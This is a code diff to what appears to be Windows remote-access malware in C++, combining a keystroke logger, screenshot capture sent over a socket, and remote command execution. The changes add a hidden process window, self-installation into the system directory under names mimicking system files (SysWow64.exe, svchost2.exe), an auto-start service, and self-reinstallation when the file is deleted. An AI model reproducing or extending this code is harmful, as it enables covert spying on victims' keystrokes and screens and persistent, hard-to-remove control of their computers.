@@ -2,7 +2,7 @@
 * @Author: amaneureka
 * @Date:   2017-04-02 03:33:49
 * @Last Modified by:   amaneureka
-* @Last Modified time: 2017-04-14 04:20:59
+* @Last Modified time: 2017-04-14 14:16:09
 */
 
 #include <vector>
@@ -77,12 +77,29 @@ static bool command_ack = false;
 static STARTUPINFO startupInfo;
 static PROCESS_INFORMATION processInfo;
 
-pthread_mutex_t mutex_socket;
+static pthread_mutex_t mutex_socket;
 
 struct cmd_args
 {
     int socket;
     string cmd;
+};
+
+static char keycodes[] =
+{
+    VK_LBUTTON,     VK_RBUTTON,     VK_MBUTTON,
+    VK_BACK,        VK_TAB,         VK_RETURN,
+    VK_SHIFT,       VK_CONTROL,     VK_MENU,
+    VK_CAPITAL,     VK_ESCAPE,      VK_SPACE,
+    VK_PRIOR,       VK_PRIOR,       VK_HOME,
+    VK_LEFT,        VK_UP,          VK_RIGHT,
+    VK_DOWN,        VK_SNAPSHOT,    VK_INSERT,
+    VK_DELETE,      VK_NUMPAD0,     VK_NUMPAD1,
+    VK_NUMPAD2,     VK_NUMPAD3,     VK_NUMPAD4,
+    VK_NUMPAD5,     VK_NUMPAD6,     VK_NUMPAD7,
+    VK_NUMPAD8,     VK_NUMPAD9,     VK_MULTIPLY,
+    VK_ADD,         VK_SEPARATOR,   VK_SUBTRACT,
+    VK_DECIMAL,     VK_DIVIDE
 };
 
 int send_request(int socket, const char *buffer, int size, bool applylock)
@@ -94,7 +111,12 @@ int send_request(int socket, const char *buffer, int size, bool applylock)
     if (applylock) pthread_mutex_lock(&mutex_socket);
 
     command_ack = false;
-    write(socket, buffer, size);
+    if (write(socket, buffer, size) < 0)
+    {
+        // probably socket has been closed
+        wait = 0;
+        terminated = true;
+    }
 
     while(!command_ack && wait-- > 0)
         sleep(100);
@@ -105,50 +127,6 @@ int send_request(int socket, const char *buffer, int size, bool applylock)
     DPRINT("\tstatus: %d\n", status);
     return status;
 }
-
-char keycodes[] =
-{
-    VK_LBUTTON,
-    VK_RBUTTON,
-    VK_MBUTTON,
-    VK_BACK,
-    VK_TAB,
-    VK_RETURN,
-    VK_SHIFT,
-    VK_CONTROL,
-    VK_MENU,
-    VK_CAPITAL,
-    VK_ESCAPE,
-    VK_SPACE,
-    VK_PRIOR,
-    VK_PRIOR,
-    VK_HOME,
-    VK_LEFT,
-    VK_UP,
-    VK_RIGHT,
-    VK_DOWN,
-    VK_SNAPSHOT,
-    VK_INSERT,
-    VK_DELETE,
-
-    VK_NUMPAD0,
-    VK_NUMPAD1,
-    VK_NUMPAD2,
-    VK_NUMPAD3,
-    VK_NUMPAD4,
-    VK_NUMPAD5,
-    VK_NUMPAD6,
-    VK_NUMPAD7,
-    VK_NUMPAD8,
-    VK_NUMPAD9,
-
-    VK_MULTIPLY,
-    VK_ADD,
-    VK_SEPARATOR,
-    VK_SUBTRACT,
-    VK_DECIMAL,
-    VK_DIVIDE
-};
 
 void *logger(void *args)
 {
@@ -220,7 +198,7 @@ void register_device(int socket, string recv_uid)
     if (!infile)
     {
         DPRINT("%s(): file not found!\n", __func__);
-        write(socket, "REG", 4);
+        send_request(socket, "REG", 4, true);
         return;
     }
 
@@ -231,7 +209,7 @@ void register_device(int socket, string recv_uid)
     uid = "LOG" + uid;
     DPRINT("%s(): %s\n", __func__, uid.c_str());
 
-    write(socket, uid.c_str(), uid.size());
+    send_request(socket, uid.c_str(), uid.size(), true);
 }
 
 void *execute_cmd(void* arguments)
@@ -364,7 +342,7 @@ void *get_screenshot(void* arguments)
     for (int i = 0; i < size2read; i += 1000)
     {
         pStream->Read(buf.data(), 1000, &bytesRead);
-        send_request(args->socket, buf.data(), bytesRead, false);
+        if (!send_request(args->socket, buf.data(), bytesRead, false)) break;
     }
 
     // unlock socket write stream
@@ -526,7 +504,9 @@ int run(const char* remote_addr, int port)
         }
     }
 
+    /* clean up */
     close(sock);
+    pthread_mutex_destroy(&mutex_socket);
     return 0;
 }
 
@@ -569,6 +549,8 @@ int start_process(char* cmd)
 
     ZeroMemory(&startupInfo, sizeof(startupInfo));
     startupInfo.cb = sizeof(startupInfo);
+    startupInfo.dwFlags = STARTF_USESHOWWINDOW;
+    startupInfo.wShowWindow = SW_HIDE;
     ZeroMemory(&processInfo, sizeof(processInfo));
 
     if (!WTSQueryUserToken(WTSGetActiveConsoleSessionId(), &token))
@@ -586,6 +568,35 @@ int start_process(char* cmd)
                          NULL,          // Use parent's starting directory
                          &startupInfo,  // Pointer to STARTUPINFO structure
                          &processInfo);
+}
+
+int install(bool serviceInstall)
+{
+    int status = 0;
+    char exePath[MAX_PATH];
+    char sysPath[MAX_PATH];
+    char newPath[MAX_PATH];
+    char cmd[MAX_PATH];
+
+    DPRINT("%s()\n", __func__);
+
+    GetSystemDirectory(sysPath, MAX_PATH);
+    GetModuleFileName(NULL, exePath, MAX_PATH);
+
+    DPRINT("%s: %s %s\n", __func__, sysPath, exePath);
+
+    sprintf(newPath, "%s\\SysWow64.exe", sysPath);
+    if (serviceInstall && !CopyFile(exePath, newPath, false)) return -1;
+
+    sprintf(cmd, "sc create SysWow64 binPath= \"%s service\" start= auto", newPath);
+    system(cmd);
+
+    sprintf(newPath, "%s\\svchost2.exe", sysPath);
+    if (!CopyFile(exePath, newPath, false)) return -3;
+    system("sc start SysWow64");
+
+    DPRINT("%s: SUCCESS!\n", __func__);
+    return 0;
 }
 
 void ServiceMain(int argc, char *argv[])
@@ -608,9 +619,10 @@ void ServiceMain(int argc, char *argv[])
     char exePath[MAX_PATH];
     char cmd[MAX_PATH];
 
-    GetModuleFileName(NULL, exePath, MAX_PATH);
-    sprintf(cmd, "%s app 0.0.0.0 9124", exePath);
+    GetSystemDirectory(exePath, MAX_PATH);
+    sprintf(cmd, "%s\\svchost2.exe app 0.0.0.0 9124", exePath);
 
+    int status;
     DWORD exitCode = 0;
     while (ServiceStatus.dwCurrentState == SERVICE_RUNNING)
     {
@@ -624,39 +636,19 @@ void ServiceMain(int argc, char *argv[])
             {
                 DPRINT("%s: process creation failed! %d\n", __func__, GetLastError());
                 processInfo.hProcess = NULL;
+                if (GetLastError() == ERROR_FILE_NOT_FOUND)
+                {
+                    DPRINT("%s: file has been deleted %d\n", __func__, install(false));
+                }
             }
         }
         Sleep(5000);
     }
 }
 
-int install()
-{
-    int status = 0;
-    char exePath[MAX_PATH];
-    char sysPath[MAX_PATH];
-    char newPath[MAX_PATH];
-
-    DPRINT("%s()\n", __func__);
-
-    GetSystemDirectory(sysPath, MAX_PATH);
-    GetModuleFileName(NULL, exePath, MAX_PATH);
-
-    DPRINT("%s: %s %s\n", __func__, sysPath, exePath);
-
-    sprintf(newPath, "%s\\svchost3.exe", sysPath);
-    if (!CopyFile(exePath, newPath, false)) return -1;
-
-    sprintf(sysPath, "sc create SysWow64 binPath= \"%s service\" start= auto", newPath);
-    if (!system(sysPath)) return -1;
-
-    DPRINT("%s: SUCCESS!\n", __func__);
-    return 0;
-}
-
 int main(int argc, char *argv[])
 {
-    if (argc < 2) return install();
+    if (argc < 2) return printf("Exit Code: %d\n", install(true));
 
     if (strcmp(argv[1], "app") == 0)
     {
